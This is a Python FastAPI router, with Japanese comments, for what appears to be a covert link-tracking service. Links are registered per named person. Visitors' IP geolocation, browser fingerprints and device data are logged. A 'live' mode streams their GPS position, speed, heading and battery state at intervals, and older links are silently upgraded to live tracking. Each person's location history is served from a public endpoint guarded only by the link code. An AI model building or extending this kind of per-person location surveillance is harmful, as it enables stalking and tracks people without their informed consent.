"""追跡ルーター：リンク踏み（一瞬/ライブ）・人物ごとの登録・追跡画面。

main.py の snsx と同じ場所で include する:
    from . import tracks
    app.include_router(tracks.router)

/l/ 配下はこのモジュールが担当する（main.py の同名ルートより先に登録されるため）。
認証・render・ヒット記録は main.py 側を遅延参照して使い回すので挙動がズレない。
"""
from __future__ import annotations

import os, json, random, string, datetime as dt

from fastapi import APIRouter, Request, Depends, Form, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse, PlainTextResponse

from . import users, persist, linktrack, tenancy
from .tenancy import db

router = APIRouter()

LIVE_IV_MIN, LIVE_IV_MAX = 5, 600
TRACK_KEEP = int(os.getenv("TRACK_KEEP", "20000"))
LIVE_MAX_MIN = int(os.getenv("LIVE_MAX_MIN", "180"))
# 旧版は「リアルタイム追跡」を選んでも page として保存されていた。
# その救済として、page のリンクは初回アクセスで live に昇格させる。
PROMOTE_PAGE = os.getenv("PROMOTE_PAGE_TO_LIVE", "1") != "0"


def _m():
    from . import main
    return main


def render(name, request, **ctx):
    return _m().render(name, request, **ctx)


async def auth(request: Request):
    return await _m().auth(request)


def _record_hit(request, code):
    return _m()._record_hit(request, code)


def _now():
    return _m().now_iso()


def _bind_owner(code):
    """code から所有者を引き、テナント文脈を張る。"""
    owner = users.owner_of_link(code)
    if not owner:
        return None
    tenancy.set_current(owner)
    try:
        persist.touch(owner, interval=persist.cfg()["every_hit"])
    except Exception:
        pass
    return owner


# ---------- 小物 ----------

def _f(v):
    try:
        return float(v)
    except (TypeError, ValueError):
        return None


def _recent(ts, sec):
    if not ts:
        return False
    try:
        t = dt.datetime.fromisoformat(ts)
        if t.tzinfo is None:
            t = t.replace(tzinfo=dt.timezone.utc)
        return (dt.datetime.now(dt.timezone.utc) - t).total_seconds() <= sec
    except Exception:
        return False


def _clamp_iv(v):
    try:
        v = int(v or 15)
    except Exception:
        v = 15
    return max(LIVE_IV_MIN, min(v, LIVE_IV_MAX))


def _new_code(n=8):
    a = string.ascii_lowercase + string.digits
    for _ in range(60):
        c = "".join(random.choice(a) for _ in range(n))
        if not db.link_get(c):
            return c
    return "".join(random.choice(a) for _ in range(n + 4))


def _get_track(code):
    """追跡として使えるリンクを返す。

    live/snap はそのまま。page として保存されてしまったリンクは
    ここで live に昇格させて救済する。
    """
    link = db.track_get(code)
    if link:
        return link
    l = db.link_get(code)
    if l and (l["mode"] or "page") == "page" and PROMOTE_PAGE:
        db.track_update(code, mode="live", interval=_clamp_iv(l["interval"]))
        return db.track_get(code)
    return l


def _tp_row(code, link, ip, p, g, q, kind="pt", sid="", note=""):
    """track_points 1行分。GPSが無ければIPの推定座標を入れる。"""
    lat = _f(q.get("lat") if q.get("lat") is not None else q.get("gps_lat"))
    lon = _f(q.get("lon") if q.get("lon") is not None else q.get("gps_lon"))
    if lat is not None and not (-90.0 <= lat <= 90.0):
        lat = None
    if lon is not None and not (-180.0 <= lon <= 180.0):
        lon = None
    src = "gps"
    if lat is None and g.get("lat") is not None:
        lat, lon, src = _f(g.get("lat")), _f(g.get("lon")), "ip"
    acc = _f(q.get("acc") if q.get("acc") is not None else q.get("gps_acc"))
    ts = str(q.get("ts") or "")[:32]
    if len(ts) < 19:
        ts = _now()
    chg = q.get("chg")
    rid = None
    try:
        rid = link["rid"] if link and "rid" in link.keys() else None
    except Exception:
        rid = None
    return {
        "code": code, "link_id": rid,
        "person": (link["person"] or link["name"]) if link else "",
        "sid": (sid or str(q.get("sid") or ""))[:40], "ts": ts,
        "kind": str(q.get("kind") or kind)[:12], "src": src,
        "lat": lat, "lon": lon, "acc": acc,
        "spd": _f(q.get("spd")), "hdg": _f(q.get("hdg")),
        "ip": ip, "country": g.get("country"), "country_code": g.get("country_code"),
        "region": g.get("region"), "city": g.get("city"),
        "isp": g.get("isp"), "asn": g.get("asn"),
        "device": p.get("device"), "os": p.get("os"), "browser": p.get("browser"),
        "inapp": p.get("inapp"), "battery": _f(q.get("batt")),
        "charging": None if chg is None else (1 if chg else 0),
        "screen": str(q.get("scr") or "")[:40], "note": (note or "")[:40],
    }


def _live_page(request, code, hid, link, nonce):
    return render("link_live.html", request, code=code, hit_id=hid, link=link,
                  dest=link["dest"] or "", nonce=nonce,
                  iv=_clamp_iv(link["interval"]), maxmin=LIVE_MAX_MIN)


# ================= 公開ルート（/l/ 配下を引き継ぐ） =================

@router.get("/l/{code}")
def link_hit(code: str, request: Request):
    if not _bind_owner(code):
        return PlainTextResponse("リンクが無効です", status_code=404)
    link = db.link_get(code)
    if not link or not link["active"]:
        return PlainTextResponse("リンクが無効です", status_code=404)
    hid = _record_hit(request, code)
    hrow = db.q1("SELECT nonce FROM link_hits WHERE id=?", (hid,))
    nonce = (hrow["nonce"] if hrow else "") or ""
    mode = (link["mode"] or "page")

    if mode == "redirect" and link["dest"]:
        return RedirectResponse(link["dest"], 302)

    if mode == "quiz" and db.questions(code):
        qs = [{"id": r["id"], "qtype": r["qtype"], "prompt": r["prompt"],
               "options": json.loads(r["options"] or "[]")} for r in db.questions(code)]
        return render("link_quiz.html", request, code=code, hit_id=hid, link=link,
                      dest=link["dest"] or "", nonce=nonce,
                      questions_json=json.dumps(qs, ensure_ascii=False))

    if mode == "identify":
        ip = linktrack.client_ip(request)
        return render("link_identify.html", request, code=code, hit_id=hid, link=link,
                      dest=link["dest"] or "", nonce=nonce, ip=ip,
                      p=linktrack.parse_ua(request.headers.get("user-agent", "")),
                      g=linktrack.geo(ip))

    # 連続追跡モード（page のリンクは初回に live へ昇格）
    if mode == "live" or (mode == "page" and PROMOTE_PAGE):
        if mode != "live":
            db.track_update(code, mode="live", interval=_clamp_iv(link["interval"]))
            link = db.link_get(code) or link
        return _live_page(request, code, hid, link, nonce)

    return render("link_land.html", request, code=code, hit_id=hid, link=link,
                  dest=link["dest"] or "", nonce=nonce)


@router.post("/l/{code}/x")
async def link_extra(code: str, request: Request):
    if not _bind_owner(code):
        return {"ok": False}
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    hid = body.get("hit_id")
    if not hid:
        return {"ok": False}

    ip = linktrack.client_ip(request)
    ua = request.headers.get("user-agent", "")
    p = linktrack.parse_ua(ua)
    g = linktrack.geo(ip)

    f = {}
    for k in ("screen", "tz", "platform", "cores", "mem", "touch"):
        if body.get(k) not in (None, ""):
            f[k] = body[k]
    if body.get("gps_lat") is not None:
        f["gps_lat"] = body.get("gps_lat")
        f["gps_lon"] = body.get("gps_lon")
        f["gps_acc"] = body.get("gps_acc")
    if body.get("fp"):
        f["fingerprint"] = str(body["fp"])[:128]
    if body.get("fp_json"):
        f["fp_json"] = json.dumps(body["fp_json"], ensure_ascii=False)[:8000]
    if body.get("vid"):
        f["vid"] = str(body["vid"])[:64]
    if body.get("pubkey"):
        f["pubkey"] = str(body["pubkey"])[:512]
    if body.get("sig"):
        f["sig"] = str(body["sig"])[:512]
    if f:
        db.update_hit(int(hid), **f)

    row = db.q1("SELECT nonce,vid,pubkey,sig FROM link_hits WHERE id=?", (int(hid),))
    if row and row["nonce"] and row["pubkey"] and row["sig"]:
        db.update_hit(int(hid), sig_ok=1 if linktrack.verify_sig(
            row["pubkey"], row["sig"], row["nonce"]) else 0)

    vid = (row["vid"] if row else "") or ""
    if vid:
        db.upsert_visitor(
            vid, ip=ip, country=g.get("country"), region=g.get("region"),
            city=g.get("city"), isp=g.get("isp"), asn=g.get("asn"),
            device=p["device"], os=p["os"], browser=p["browser"], inapp=p["inapp"],
            fingerprint=str(body.get("fp") or "")[:128],
            pubkey=str(body.get("pubkey") or "")[:512])

    # 一瞬タイプのGPSを追跡履歴にも残す
    link = db.track_get(code)
    if link and link["active"] and body.get("gps_lat") is not None:
        trow = _tp_row(code, link, ip, p, g, body, kind="snap", sid=vid)
        db.add_points(code, [trow])
        db.track_update(code, last_ts=trow["ts"], last_lat=trow["lat"],
                        last_lon=trow["lon"], last_acc=trow["acc"],
                        last_city=trow["city"], last_ip=trow["ip"],
                        last_src=trow["src"], points=int(link["points"] or 0) + 1)
    return {"ok": True, "vid": vid}


@router.post("/l/{code}/p")
async def link_point(code: str, request: Request):
    """ライブ追跡の座標受信。バッチ可。重複は捨てる。"""
    if not _bind_owner(code):
        return {"ok": 0, "why": "noowner"}
    link = _get_track(code)
    if not link or not link["active"]:
        return {"ok": 0, "why": "invalid"}

    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}

    ip = linktrack.client_ip(request)
    p = linktrack.parse_ua(request.headers.get("user-agent", ""))
    g = linktrack.geo(ip)

    sid = str(body.get("sid") or "")[:40]
    hid = str(body.get("hit") or "")[:20]
    kind = str(body.get("kind") or "pt")[:12]
    if kind not in ("pt", "open", "hb", "stop"):
        kind = "pt"

    raw = body.get("pts")
    raw = raw if isinstance(raw, list) else []
    if body.get("lat") is not None:
        raw = [body] + raw
    raw = raw[:200]

    prev = db.last_point(code)
    pkey = (round(prev["lat"], 5), round(prev["lon"], 5)) \
        if prev and prev["lat"] is not None else None
    pts_ts = prev["ts"] if prev else ""

    rows, last = [], None
    for q in raw:
        if not isinstance(q, dict):
            continue
        row = _tp_row(code, link, ip, p, g, q, kind="pt", sid=sid, note=hid)
        if row["lat"] is not None:
            key = (round(row["lat"], 5), round(row["lon"], 5))
            if key == pkey and row["ts"][:19] == (pts_ts or "")[:19]:
                continue
            pkey, pts_ts = key, row["ts"]
        rows.append(row)
        last = row

    n = db.add_points(code, rows)
    fields = {"live": 0 if kind == "stop" else 1, "session_id": sid}
    if last:
        fields.update(last_ts=last["ts"], last_lat=last["lat"], last_lon=last["lon"],
                      last_acc=last["acc"], last_city=last["city"], last_ip=last["ip"],
                      last_src=last["src"], last_batt=last["battery"],
                      last_charging=last["charging"])
    if n:
        fields["points"] = int(link["points"] or 0) + n
    db.track_update(code, **fields)
    if n and (int(link["points"] or 0) % 500) < n:
        db.prune_points(code, keep=TRACK_KEEP)

    return {"ok": 1, "n": n, "iv": _clamp_iv(link["interval"]), "server": _now()}


@router.get("/api/track/{code}")
def api_track(code: str, request: Request, since: int = 0, limit: int = 1500):
    """追跡画面がポーリングする公開JSON。code が実質のパスワード。"""
    if not _bind_owner(code):
        raise HTTPException(404, "noowner")
    link = _get_track(code)
    if not link:
        raise HTTPException(404, "notrack")
    try:
        since = int(since)
    except Exception:
        since = 0
    try:
        limit = min(max(int(limit), 1), 5000)
    except Exception:
        limit = 1500
    rows = db.points(code, since=since, limit=limit)
    iv = _clamp_iv(link["interval"])
    return {
        "person": link["person"] or link["name"], "name": link["name"],
        "dest": link["dest"] or "", "mode": link["mode"],
        "active": bool(link["active"]), "interval": iv,
        "live": bool(link["live"]) and _recent(link["last_ts"], max(90, iv * 4)),
        "last": {"ts": link["last_ts"], "lat": link["last_lat"], "lon": link["last_lon"],
                 "acc": link["last_acc"], "city": link["last_city"],
                 "ip": link["last_ip"], "src": link["last_src"],
                 "batt": link["last_batt"], "chg": link["last_charging"]},
        "count": db.point_count(code),
        "sessions": [{"sid": s["sid"], "first": s["first"], "last": s["last"], "n": s["n"]}
                     for s in db.track_sessions(code)],
        "points": [{"id": r["id"], "ts": r["ts"], "lat": r["lat"], "lon": r["lon"],
                    "acc": r["acc"], "src": r["src"], "city": r["city"], "ip": r["ip"],
                    "batt": r["battery"], "chg": r["charging"], "spd": r["spd"]}
                   for r in rows],
        "server": _now(),
    }


# ================= 追跡の管理画面 =================

@router.get("/tracks", response_class=HTMLResponse)
def tracks_page(request: Request, u=Depends(auth)):
    rows = []
    for r in db.tracks(500):
        d = dict(r)
        d["pts"] = db.point_count(d["code"])
        d["live"] = bool(d["live"]) and _recent(d["last_ts"], 90)
        rows.append(d)
    groups = {}
    for r in rows:
        groups.setdefault(r.get("person") or r["name"] or "名無し", []).append(r)
    return render("tracks.html", request, rows=rows, groups=groups,
                  base=_m()._base(request))


@router.post("/tracks/add")
def tracks_add(request: Request, person: str = Form(""), mode: str = Form("snap"),
               interval: int = Form(15), dest: str = Form(""), note: str = Form(""),
               u=Depends(auth)):
    person = (person or "").strip()[:40] or "名無し"
    mode = mode if mode in ("snap", "live") else "snap"
    code = _new_code()
    db.add_track(code, person, mode=mode, interval=_clamp_iv(interval),
                 dest=(dest or "").strip(), note=(note or "").strip()[:200])
    try:
        users.register_link(code, u)
    except Exception:
        pass
    return RedirectResponse(f"/track/{code}", status_code=303)


@router.get("/track/{code}", response_class=HTMLResponse)
def track_view(code: str, request: Request, u=Depends(auth)):
    link = db.track_get(code)
    if not link:
        raise HTTPException(404)
    rows = db.points(code, limit=5000)
    pts = [{"id": r["id"], "ts": r["ts"], "lat": r["lat"], "lon": r["lon"],
            "acc": r["acc"], "src": r["src"], "city": r["city"], "ip": r["ip"],
            "batt": r["battery"]} for r in rows]
    return render("track_view.html", request, link=link, pts=pts,
                  pts_json=json.dumps(pts, ensure_ascii=False),
                  live=bool(link["live"]) and _recent(link["last_ts"], 90),
                  sessions=db.track_sessions(code), days=db.track_days(code),
                  base=_m()._base(request), n=len(pts))


@router.post("/track/{code}/update")
def track_update_route(request: Request, code: str, person: str = Form(""),
                       mode: str = Form(""), interval: int = Form(0),
                       note: str = Form(""), active: str = Form(""),
                       u=Depends(auth)):
    link = db.track_get(code)
    if not link:
        raise HTTPException(404)
    f = {}
    if person.strip():
        f["name"] = f["person"] = person.strip()[:40]
    if mode in ("snap", "live"):
        f["mode"] = mode
    if interval:
        f["interval"] = _clamp_iv(interval)
    f["note"] = (note or "").strip()[:200]
    if active in ("0", "1"):
        f["active"] = int(active)
    db.track_update(code, **f)
    return RedirectResponse(f"/track/{code}", status_code=303)


@router.post("/track/{code}/clear")
def track_clear(request: Request, code: str, u=Depends(auth)):
    db.clear_points(code)
    return RedirectResponse(f"/track/{code}", status_code=303)


@router.post("/track/{code}/delete")
def track_delete(request: Request, code: str, u=Depends(auth)):
    db.del_track(code)
    try:
        users.unregister_link(code)
    except Exception:
        pass
    return RedirectResponse("/tracks", status_code=303)